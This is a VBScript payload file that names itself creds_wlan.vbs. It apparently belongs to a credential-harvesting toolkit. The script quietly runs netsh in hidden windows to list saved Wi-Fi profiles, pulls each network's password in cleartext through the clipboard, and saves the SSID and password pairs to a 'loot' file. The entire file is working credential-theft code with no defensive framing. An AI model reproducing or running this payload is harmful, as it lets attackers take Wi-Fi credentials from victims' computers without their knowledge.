' Define local variables.
wlanCreds = Array()

' Log the payload.
Log "PAYLOAD", "Payload creds_wlan.vbs has been launched."

' Get the SSIDs.
WScript.CreateObject("WScript.Shell").Run "cmd.exe /C netsh wlan show profile | clip", 0, True
clipTemp = Split(CreateObject("htmlfile").ParentWindow.ClipboardData.GetData("text"), vbcrlf)
For i = 0 To UBound(clipTemp)
	If Instr(clipTemp(i), "All User Profile") <> 0 Then
		ReDim Preserve wlanCreds(UBound(wlanCreds) + 1)
		wlanCreds(UBound(wlanCreds)) = Replace(clipTemp(i), "    All User Profile     : ", "")
	End If
	
	If Instr(clipTemp(i), "Current User Profile") <> 0 Then
		ReDim Preserve wlanCreds(UBound(wlanCreds) + 1)
		wlanCreds(UBound(wlanCreds)) = Replace(clipTemp(i), "    Current User Profile : ", "")
	End If
Next

' Get the passwords.
For i = 0 To UBound(wlanCreds)
	WScript.CreateObject("WScript.Shell").Run "cmd.exe /C netsh wlan show profile """ & wlanCreds(i) & """ key=clear | clip", 0, True
	clipTemp = Split(CreateObject("htmlfile").ParentWindow.ClipboardData.GetData("text"), vbcrlf)
	
	For j = 0 To UBound(clipTemp)
		If Instr(clipTemp(j), "Key Content") <> 0 Then
			wlanCreds(i) = wlanCreds(i) & ":" & Replace(clipTemp(j), "    Key Content            : ", "")
		End If
	Next
Next

' Write to text file.
Set fileWlan = CreateObject("Scripting.FileSystemObject").CreateTextFile(PATH_LOOT & "creds_wlan.txt", True)
For i = 0 To UBound(wlanCreds)
	If i <> UBound(wlanCreds) Then
		fileWlan.Write(wlanCreds(i) & vbCrLf)
	Else
		fileWlan.Write(wlanCreds(i))
	End If
Next
fileWlan.Close
